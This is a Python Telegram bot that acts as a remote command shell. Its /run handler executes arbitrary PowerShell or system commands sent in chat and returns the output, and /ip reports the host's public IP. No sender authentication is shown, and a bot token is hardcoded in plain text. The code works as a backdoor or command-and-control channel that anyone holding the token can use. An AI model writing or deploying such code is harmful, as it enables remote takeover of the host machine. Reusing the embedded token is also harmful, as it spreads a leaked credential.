from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

import asyncio
import command
import subprocess
from requests import get
import time
from datetime import datetime
from threading import Thread
import subprocess
import platform

Token = "5934071007:AAET8cYPUJlca2SqGTJ_xlLqYbOkUbDdcbc"
started = False
pinging = False

print("Bot started ...")
#print(platform.platform())
PLATFORM = platform.system()
print(PLATFORM)

async def display(update, message):
    print(message)
    await reply(update, message)

async def reply(update, message):
    await update.message.reply_text(message)

def getPublicIpAddress():
    ip = get('https://api.ipify.org').content.decode('utf8')
    return format(ip)

async def sendPublicIpAddress(update):
    ip = getPublicIpAddress()
    await reply(update,ip)


def runCommand(commandArray):
    res = command.run(commandArray)
    return res.output.decode("utf-8")

def runWinCommand(cmd):
    message = "Empty"
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True, encoding="utf-8")
    if completed.returncode != 0:
        print("An error occured: %s", completed.stderr)
    else:
        message = completed.stdout
        print(message)
    return message

def getInfo():
    # whoami = runCommand(['whoami'])
    _whoami = "test"
    _ip = getPublicIpAddress()
    text = "- whoami : "+_whoami + "\n- Public IP : "+_ip
    return text

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global started
    if started == False:
        started = True
        asyncio.get_event_loop().create_task(sendPublicIpAddress(update))
    else:
        await display(update, "Session has already been started.")
    print("Started : "+str(started))

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global started
    if started == False:
        await display(update, "Task isn't started yet.")
    else:
        started = False
        await display(update, "Task has been stopped.")

    print("Started : "+str(started))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await display(update, "Started fetching info...")
    await display(update, getInfo())

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = "Getting the public IP address..."
    await display(update, message)
    await sendPublicIpAddress(update)

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    str = update.message.text
    arr = str.split()
    arr.pop(0)
    result = " ".join(arr)
    if PLATFORM == "Windows":
        message = runWinCommand(result)
    else:
        message = runCommand(arr)
    await display(update, message)

app = ApplicationBuilder().token(Token).build()

app.add_handler(CommandHandler('start', start))
app.add_handler(CommandHandler('stop', stop))
app.add_handler(CommandHandler('info', info))
app.add_handler(CommandHandler('ip', ip))
app.add_handler(CommandHandler('run', run))

app.run_polling()